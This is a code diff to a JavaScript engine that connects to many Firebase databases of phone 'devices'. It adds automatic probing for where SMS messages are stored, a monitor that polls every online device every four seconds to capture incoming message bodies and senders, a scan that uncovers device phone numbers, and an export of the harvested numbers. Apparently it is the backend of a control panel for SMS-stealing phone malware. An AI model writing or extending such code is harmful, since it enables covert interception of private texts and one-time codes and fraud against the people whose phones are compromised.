@@ -75,6 +75,19 @@ export let engine = $state({
   // Timing
   startedAt: null,
   elapsed: 0,  // seconds since start (updated every second)
+
+  // Deep Scan stats (persisted across refreshes)
+  deepScanStats: {
+    totalFound: 0,
+    totalScanned: 0,
+    lastRanAt: null,
+    lastFoundCount: 0,
+  },
+
+  // Universal message monitor / notification panel
+  notifications: [],   // { id, deviceId, connId, connName, phone, sender, body, ts, read, path }
+  unreadCount: 0,
+  monitorActive: false,
 });
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -176,8 +189,17 @@ export function getDiscoveredPhone(deviceKey) {
   return rec?.phoneNumber ?? null;
 }
 
+const _logBuffer = [];
+let _logFlushTimer = null;
+function flushLog() {
+  _logFlushTimer = null;
+  if (_logBuffer.length === 0) return;
+  const entries = _logBuffer.splice(0);
+  engine.log = [...entries.reverse(), ...engine.log].slice(0, MAX_LOG);
+}
 function addLog(msg, type = 'info') {
-  engine.log = [{ ts: nowIST(), msg, type, id: Date.now() + Math.random() }, ...engine.log].slice(0, MAX_LOG);
+  _logBuffer.push({ ts: nowIST(), msg, type, id: Date.now() + Math.random() });
+  if (!_logFlushTimer) _logFlushTimer = setTimeout(flushLog, 200);
 }
 
 function isDeviceOnline(key) {
@@ -256,13 +278,42 @@ function resetTomorrowIfNewDay() {
 // DEVICE FETCHING
 // ═══════════════════════════════════════════════════════════════════════════
 
+const _discoveredMsgPaths = {};
+async function discoverMsgPath(conn) {
+  if (_discoveredMsgPaths[conn.id]) return _discoveredMsgPaths[conn.id];
+  const configured = conn.path || 'messages';
+  const cands = [configured,'messages','sms','inbox','received','smsList','receivedSms','msgList','notifications','data'];
+  try {
+    const { data: rk } = await apiFetch(conn, '', 'GET', undefined, { shallow: 'true' });
+    if (rk && typeof rk === 'object') cands.unshift(...Object.keys(rk).filter(k => !['clients','automation','devices'].includes(k)));
+  } catch {}
+  for (const c of [...new Set(cands)]) {
+    try {
+      const { data } = await apiFetch(conn, c, 'GET', undefined, { shallow: 'true' });
+      if (data && typeof data === 'object' && Object.keys(data).length > 0) {
+        if (Object.keys(data).some(k => k.length > 8 && /^[a-zA-Z0-9_-]+$/.test(k))) {
+          _discoveredMsgPaths[conn.id] = c;
+          if (c !== configured) addLog('Auto-discovered msg path for ' + conn.name + ': ' + c, 'info');
+          return c;
+        }
+      }
+    } catch {}
+  }
+  _discoveredMsgPaths[conn.id] = configured;
+  return configured;
+}
+export function resetMsgPathCache(connId) { delete _discoveredMsgPaths[connId]; }
+export function getDiscoveredMsgPath(connId) { return _discoveredMsgPaths[connId] || null; }
 async function fetchConn(conn) {
   if (!conn.enabled) return;
   if (engine.db[conn.id]?.deactivated) return;
   engine.db[conn.id] = { ...engine.db[conn.id], loading: true, error: null };
   try {
-    const { data: keysData } = await apiFetch(conn, conn.path, 'GET', undefined, { shallow: 'true' });
-    const keys = keysData && typeof keysData === 'object' ? keysData : {};
+    const [keysResult, actualMsgPath] = await Promise.all([
+      apiFetch(conn, conn.path, 'GET', undefined, { shallow: 'true' }).catch(() => ({ data: {} })),
+      discoverMsgPath(conn),
+    ]);
+    const keys = keysResult?.data && typeof keysResult.data === 'object' ? keysResult.data : {};
     let info = {};
     const infoPathToFetch = conn.infoPath || 'clients';
     if (infoPathToFetch) {
@@ -271,17 +322,46 @@ async function fetchConn(conn) {
         if (infoData && typeof infoData === 'object') info = infoData;
       } catch {}
     }
-    engine.db[conn.id] = { loading: false, error: null, deactivated: false, keys, info, ts: new Date().toISOString() };
+    engine.db[conn.id] = { loading: false, error: null, deactivated: false, keys, info, msgPath: actualMsgPath, ts: new Date().toISOString() };
   } catch (e) {
     const isDeact = String(e.message).includes('deactivated') || String(e.message).includes('423') || String(e.message).includes('Locked');
-    engine.db[conn.id] = {
-      ...engine.db[conn.id],
-      loading: false,
-      error: isDeact ? 'Database deactivated in Firebase' : e.message,
-      deactivated: isDeact,
-      ts: new Date().toISOString()
-    };
+    engine.db[conn.id] = { ...engine.db[conn.id], loading: false, error: isDeact ? 'Database deactivated in Firebase' : e.message, deactivated: isDeact, ts: new Date().toISOString() };
   }
+}
+
+export async function probeDeviceMessagePaths(conn, deviceId) {
+  const results = [];
+  let rootKeys = [];
+  try {
+    const { data } = await apiFetch(conn, '', 'GET', undefined, { shallow: 'true' });
+    if (data && typeof data === 'object') rootKeys = Object.keys(data);
+  } catch {}
+  const disc = engine.db[conn.id]?.msgPath;
+  const knownPaths = [...(disc ? [disc] : []),'messages','sms','inbox','outbox','smsList','msgList','receivedSms','sentSms','sendHistory','notifications','clients','devices','automation'];
+  const all = [...new Set([...rootKeys, ...knownPaths])];
+  await Promise.allSettled(all.map(async (rk) => {
+    const p = `${rk}/${deviceId}`;
+    try {
+      const { data } = await apiFetch(conn, p, 'GET', undefined, { limitToLast: '5' });
+      if (data !== null && data !== undefined) {
+        const hasData = typeof data === 'object' ? Object.keys(data).length > 0 : !!data;
+        results.push({ path: p, hasData, sample: typeof data === 'object' ? JSON.stringify(data).slice(0, 200) : String(data).slice(0, 200), keyCount: typeof data === 'object' ? Object.keys(data).length : 0 });
+      }
+    } catch {}
+  }));
+  const infoPath = conn.infoPath || 'clients';
+  await Promise.allSettled(['receivedSms','sentSms','inbox','outbox','messages','sms','webhookEvent','sendHistory'].map(async (sub) => {
+    const p = `${infoPath}/${deviceId}/${sub}`;
+    try {
+      const { data } = await apiFetch(conn, p, 'GET', undefined, { limitToLast: '5' });
+      if (data !== null && data !== undefined) {
+        const hasData = typeof data === 'object' ? Object.keys(data).length > 0 : !!data;
+        results.push({ path: p, hasData, sample: typeof data === 'object' ? JSON.stringify(data).slice(0, 200) : String(data).slice(0, 200), keyCount: typeof data === 'object' ? Object.keys(data).length : 0 });
+      }
+    } catch {}
+  }));
+  results.sort((a, b) => (b.hasData ? 1 : 0) - (a.hasData ? 1 : 0));
+  return results;
 }
 
 export async function fetchAllDevices() {
@@ -295,6 +375,7 @@ export async function fetchAllDevices() {
   }
   engine.devicesLoading = false;
   persistState();
+  if (!engine.monitorActive && engine.connections.some(c => c.enabled)) startMessageMonitor();
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -416,7 +497,8 @@ async function pollForMatch(receiverDevice, targetDeviceId, startTime) {
   if (!conn) return null;
 
   try {
-    const { data } = await apiFetch(conn, `${conn.path}/${receiverDevice.key}`, 'GET', undefined, { orderBy: '"$key"', limitToLast: '50' });
+    const recvMsgPath = engine.db[conn.id]?.msgPath || conn.path || 'messages';
+    const { data } = await apiFetch(conn, `${recvMsgPath}/${receiverDevice.key}`, 'GET', undefined, { orderBy: '"$key"', limitToLast: '50' });
     if (!data || typeof data !== 'object') return null;
 
     for (const [msgId, msg] of Object.entries(data)) {
@@ -456,8 +538,22 @@ async function pollWithTimeout(receiver, targetKey, startTime) {
 // WORKER LOOP (each worker is an independent async function)
 // ═══════════════════════════════════════════════════════════════════════════
 
+const _workerPatchQueue = new Map();
+let _workerFlushPending = false;
+function flushWorkerPatches() {
+  _workerFlushPending = false;
+  if (_workerPatchQueue.size === 0) return;
+  const patches = new Map(_workerPatchQueue);
+  _workerPatchQueue.clear();
+  engine.workers = engine.workers.map(w => { const p = patches.get(w.id); return p ? { ...w, ...p } : w; });
+}
 function updateWorker(id, patch) {
-  engine.workers = engine.workers.map(w => w.id === id ? { ...w, ...patch } : w);
+  const prev = _workerPatchQueue.get(id) ?? {};
+  _workerPatchQueue.set(id, { ...prev, ...patch });
+  if (!_workerFlushPending) {
+    _workerFlushPending = true;
+    (typeof requestAnimationFrame !== 'undefined' ? requestAnimationFrame : fn => setTimeout(fn, 16))(flushWorkerPatches);
+  }
 }
 
 async function workerLoop(workerId) {
@@ -650,11 +746,16 @@ function checkAllWorkersDone() {
 let _refreshTimer = null;
 let _elapsedTimer = null;
 
+let _automationRunning = false;
+export function setAutomationRunning(val) { _automationRunning = val; }
+
 function startTimers() {
   stopTimers();
-  // Refresh devices every 30s while running
+  // Refresh devices every 30s while running — skipped when automation is active
   _refreshTimer = setInterval(() => {
-    if (engine.status === 'RUNNING') fetchAllDevices();
+    if (engine.status === 'RUNNING') {
+      if (!_automationRunning) fetchAllDevices();
+    }
   }, 30000);
   // Elapsed seconds counter
   _elapsedTimer = setInterval(() => {
@@ -1721,3 +1822,215 @@ export async function sendManualSms(fromDeviceKey, fromConnId, toPhone, message)
 }
 
 export function skippedCount() { return engine.skippedTargets.length; }
+
+// ═══════════════════════════════════════════════════════════════════
+// UNIVERSAL MESSAGE MONITOR
+// ═══════════════════════════════════════════════════════════════════
+const MAX_NOTIFICATIONS = 200;
+const MSG_MONITOR_INTERVAL_MS = 4000;
+const _msgBaselines = {};
+let _monitorTimer = null;
+
+async function _pollConn(conn) {
+  if (!conn.enabled || engine.db[conn.id]?.deactivated) return;
+  const msgPath = engine.db[conn.id]?.msgPath || conn.path || 'messages';
+  const online = Object.keys(engine.db[conn.id]?.keys || {}).filter(k => isDeviceOnline(k));
+  await Promise.allSettled(online.map(async (deviceId) => {
+    const ck = `${conn.id}::${deviceId}`;
+    if (!_msgBaselines[ck]) _msgBaselines[ck] = new Set();
+    const seen = _msgBaselines[ck];
+    const firstPoll = seen.size === 0;
+    const phone = getDisplayPhone(conn.id, deviceId, engine.db[conn.id]?.info?.[deviceId])
+      || engine.records.find(r => r.deviceId === deviceId)?.phoneNumber || '';
+    try {
+      const { data } = await apiFetch(conn, `${msgPath}/${deviceId}`, 'GET', undefined, { limitToLast: '20' });
+      if (!data || typeof data !== 'object') return;
+      for (const [msgId, msg] of Object.entries(data)) {
+        if (!msg || typeof msg !== 'object' || seen.has(msgId)) continue;
+        seen.add(msgId);
+        if (firstPoll) continue;
+        const body = String(msg.message || msg.body || msg.text || msg.msg || msg.smsBody || '');
+        const sender = String(msg.sender || msg.from || msg.address || '');
+        const ts = String(msg.dateTime || msg.timestamp || new Date().toISOString());
+        if (!body) continue;
+        const notif = { id: `${conn.id}::${deviceId}::${msgId}`, deviceId, connId: conn.id, connName: conn.name, phone, sender, body, ts, read: false, path: `${msgPath}/${deviceId}`, msgId };
+        engine.notifications = [notif, ...engine.notifications].slice(0, MAX_NOTIFICATIONS);
+        engine.unreadCount = engine.notifications.filter(n => !n.read).length;
+        addLog('SMS [' + conn.name + '] ' + deviceId.slice(0,10) + ' from ' + (sender||'?') + ': ' + body.slice(0,60), 'info');
+        apiFetch(conn, `automation/notifications/${deviceId}/${msgId}`, 'PUT', { deviceId, phone, sender, body, receivedAt: new Date().toISOString(), connId: conn.id, source: 'monitor' }).catch(() => {});
+      }
+    } catch {}
+  }));
+}
+
+async function _monitorCycle() {
+  _monitorTimer = null;
+  if (!engine.monitorActive) return;
+  const enabled = engine.connections.filter(c => c.enabled && !engine.db[c.id]?.deactivated);
+  for (let i = 0; i < enabled.length; i += 4)
+    await Promise.allSettled(enabled.slice(i, i+4).map(_pollConn));
+  if (engine.monitorActive) _monitorTimer = setTimeout(_monitorCycle, MSG_MONITOR_INTERVAL_MS);
+}
+
+export function startMessageMonitor() {
+  if (engine.monitorActive) return;
+  engine.monitorActive = true;
+  addLog('Message monitor started — all connections every 4s', 'info');
+  _monitorTimer = setTimeout(_monitorCycle, MSG_MONITOR_INTERVAL_MS);
+}
+export function stopMessageMonitor() {
+  engine.monitorActive = false;
+  if (_monitorTimer) { clearTimeout(_monitorTimer); _monitorTimer = null; }
+  addLog('Message monitor stopped', 'info');
+}
+export function markNotificationsRead() {
+  engine.notifications = engine.notifications.map(n => ({ ...n, read: true }));
+  engine.unreadCount = 0;
+}
+export function clearNotifications() {
+  engine.notifications = [];
+  engine.unreadCount = 0;
+  for (const k of Object.keys(_msgBaselines)) delete _msgBaselines[k];
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// DISCOVERY EVENT LISTENERS
+// Allows automation-engine and browser-worker to subscribe to
+// newly discovered phone numbers in real time.
+// ═══════════════════════════════════════════════════════════════════
+
+const _discoveryListeners = new Set();
+
+/** Register a callback for when a new number is discovered. */
+export function onDiscovery(fn) {
+  if (typeof fn === 'function') _discoveryListeners.add(fn);
+}
+
+/** Unregister a callback. */
+export function offDiscovery(fn) {
+  _discoveryListeners.delete(fn);
+}
+
+/** Called internally whenever a new phone number is confirmed. */
+function _emitDiscovery(deviceId, phoneNumber, connId) {
+  for (const fn of _discoveryListeners) {
+    try { fn({ deviceId, phoneNumber, connId }); } catch {}
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// PASSIVE SCAN ALL DEVICES
+// Deep-scans all devices across all connections without sending SMS.
+// Runs workers in parallel with progress callback.
+// ═══════════════════════════════════════════════════════════════════
+
+/**
+ * Passive deep scan: try to find phone numbers for all undiscovered
+ * devices by reading Firebase data (no SMS sent).
+ *
+ * @param {Function} onProgress - called with { scanned, total, found, workers }
+ * @param {{ workers?: number, onlineOnly?: boolean, onlineFirst?: boolean }} opts
+ */
+export async function passiveScanAllDevices(onProgress, opts = {}) {
+  const { workers: maxW = 4, onlineOnly = false } = opts;
+
+  const discovered = new Set(engine.records.filter(r => r.status === 'discovered').map(r => r.deviceId));
+
+  // Build target list
+  let targets = [];
+  for (const conn of engine.connections) {
+    if (!conn.enabled || engine.db[conn.id]?.deactivated) continue;
+    const keys = Object.keys(engine.db[conn.id]?.keys || {});
+    for (const key of keys) {
+      if (discovered.has(key)) continue;
+      const info = engine.db[conn.id]?.info?.[key];
+      if (onlineOnly && !isDeviceOnline(key)) continue;
+      targets.push({ conn, key, info });
+    }
+  }
+
+  const total = targets.length;
+  let scanned = 0;
+  let found = 0;
+
+  // Process in worker batches
+  const queue = [...targets];
+  const runWorker = async () => {
+    while (queue.length > 0) {
+      const t = queue.shift();
+      if (!t) break;
+      try {
+        const phone = await deepScanDeviceForPhone(t.conn, t.key, t.info);
+        scanned++;
+        if (phone) {
+          found++;
+          const record = {
+            deviceId: t.key,
+            phoneNumber: phone,
+            status: 'discovered',
+            discoveryMethod: 'passive-deep-scan',
+            messageBody: '',
+            senderDeviceId: t.key,
+            receiverDeviceId: 'passive',
+            receiverPhoneNumber: '',
+            attemptCount: 0,
+            discoveredAt: new Date().toISOString(),
+            connectionId: t.conn.id,
+            connectionName: t.conn.name,
+          };
+          // Avoid duplicates
+          if (!engine.records.some(r => r.deviceId === t.key && r.status === 'discovered')) {
+            engine.records = [...engine.records, record];
+          }
+          updateNumberAcrossConnections(t.key, phone);
+          _emitDiscovery(t.key, phone, t.conn.id);
+          // Write to Firebase
+          patchDevicePhone(t.conn, t.key, phone).catch(() => {});
+        }
+      } catch {}
+      onProgress?.({ scanned, total, found, workers: maxW });
+    }
+  };
+
+  const workerPromises = Array.from({ length: Math.min(maxW, targets.length || 1) }, runWorker);
+  await Promise.allSettled(workerPromises);
+
+  // Update deepScanStats
+  engine.deepScanStats = {
+    totalFound: (engine.deepScanStats?.totalFound || 0) + found,
+    totalScanned: (engine.deepScanStats?.totalScanned || 0) + scanned,
+    lastRanAt: new Date().toISOString(),
+    lastFoundCount: found,
+  };
+
+  return { scanned, total, found };
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// SHAREABLE TEXT EXPORT
+// ═══════════════════════════════════════════════════════════════════
+
+/**
+ * Generate shareable text from discovered records.
+ * @param {'plain'|'json'|'mapping'} format
+ */
+export function getShareableText(format = 'plain') {
+  const records = engine.records.filter(r => r.status === 'discovered' && r.phoneNumber);
+  if (records.length === 0) return null;
+
+  if (format === 'json') {
+    return JSON.stringify(records.map(r => ({
+      deviceId: r.deviceId,
+      phone: r.phoneNumber,
+      connection: r.connectionName,
+      discoveredAt: r.discoveredAt,
+    })), null, 2);
+  }
+
+  if (format === 'mapping') {
+    return records.map(r => `${r.deviceId}=${r.phoneNumber}`).join('\n');
+  }
+
+  // Default: plain list of phone numbers
+  return [...new Set(records.map(r => r.phoneNumber))].join('\n');
+}
